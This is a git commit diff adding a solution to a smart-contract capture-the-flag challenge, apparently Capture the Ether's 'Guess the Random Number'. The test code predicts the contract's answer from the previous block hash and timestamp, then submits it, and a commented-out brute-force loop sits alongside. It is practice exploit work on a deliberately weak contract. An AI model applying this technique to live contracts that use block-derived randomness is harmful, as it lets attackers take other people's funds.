cce4b2af45cde039b8dc3831368d06d48176848d
Thomas Hepner <hepner.thomas@gmail.com>
2023-04-28 13:40:56 -0700

    feat: complete the guess the random number challenge.

--- test/06-GuessTheRandomNumber.test.ts
+++ test/06-GuessTheRandomNumber.test.ts
@@ -24,9 +24,39 @@ describe('GuessTheRandomNumberChallenge', () => {
   });
 
   it('exploit', async () => {
-    /**
-     * YOUR CODE HERE
-     * */
+
+    // First approach: Use a loop to brute force the random number since it's a uint8
+    // Note: This does not work because each guess requires sending 1 ether to the contract!
+    // However, it is usefulf for double-checking the answer.
+
+    // let targetBalance = await provider.getBalance(target.address);
+    // let randomNumber = 0;
+    // for(let i = 0; i < 256; i++) {
+    //   await target.guess(i, {value: utils.parseEther('1')});
+    //   const newBalance = await provider.getBalance(target.address);
+    //   if (newBalance.sub(targetBalance).isNegative()) {
+    //     console.log(`${i}: ` , targetBalance);
+    //     randomNumber = i;
+    //   }
+    //   targetBalance = newBalance;
+    // }
+
+    // await target.guess(randomNumber, {value: utils.parseEther('1')});
+
+    const transactionHash = target.deployTransaction.hash;
+    const currentBlock = await provider.getBlock(target.deployTransaction.blockNumber!);
+    const previousBlock = await provider.getBlock(target.deployTransaction.blockNumber! - 1 ?? 0);
+    const previousBlockHash = previousBlock.hash;
+    const timestamp = currentBlock.timestamp;
+
+    const keccakHash = utils.solidityKeccak256([ "bytes32", "uint256" ], [ previousBlockHash, timestamp ]);
+
+    const answer = ethers.BigNumber.from(keccakHash).mod(256).toNumber();
+    await target.guess(answer, {value: utils.parseEther('1')});
+
+    console.log('answer: ', answer);
+    // NOTE: uncomment this line to verify the answer is correct
+    // console.log('random number', randomNumber);
 
     expect(await target.isComplete()).to.equal(true);
   });
